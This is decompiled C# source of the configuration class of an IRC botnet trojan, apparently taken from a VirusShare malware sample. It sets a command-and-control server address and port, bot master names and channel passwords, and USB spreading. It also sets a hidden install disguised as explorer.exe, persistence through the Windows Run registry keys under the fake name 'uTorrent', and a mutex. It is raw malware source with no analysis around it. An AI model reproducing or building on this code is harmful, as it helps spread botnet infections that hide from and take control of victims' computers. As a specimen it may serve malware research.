﻿// Decompiled with JetBrains decompiler
// Type: Hearding_Bot.Config
// Assembly: Hearding Bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 931E7B23-EA6E-4139-8BD0-1A4E0BF9E258
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Fsysna.dljm-a7abcca3397d1344b43d53c1427609ca1808f1991c5d2b158fd67c1ea3e6f19a.exe

using System;

namespace Hearding_Bot
{
  internal class Config
  {
    public const string taskmngrDes = "Windows Explorer";
    public static string botPassword = "anders";
    public static string botRandom = botInfo.randID();
    public static string[] ircMasters = new string[2]
    {
      "SequenceInitiated",
      "Parker"
    };
    public static string ircCommandPrefix = "!";
    public static string ircNick = "[" + botInfo.countryCode(botInfo.codeType.Short) + "|" + botInfo.getOS() + "|" + Config.botRandom + "]";
    public static string newNick = "{NEW}" + Config.ircNick;
    public static string ircHost = "asdsadasda.no-ip.org";
    public static int ircPort = 6667;
    public static string ircPass = "";
    public static string ircChannel = "#Installs";
    public static string ircChannelPass = "boatnet";
    public static string usbFile = "setup.exe";
    public static string installPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\System32\\mswindows\\";
    public static string installFile = "explorer.exe";
    public static bool installFileHidden = true;
    public static bool installFileSystem = false;
    public static string mutex = "qafourezzzdsaafdsafhdjksahdjksahasdfsafsadgagsfsdfdkjsahsdxcd";
    public static string regInfoPath = "Software\\Microsoft\\Security";
    public static string startupName = "uTorrent";
    public static string[] startupKeys = new string[2]
    {
      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices"
    };
  }
}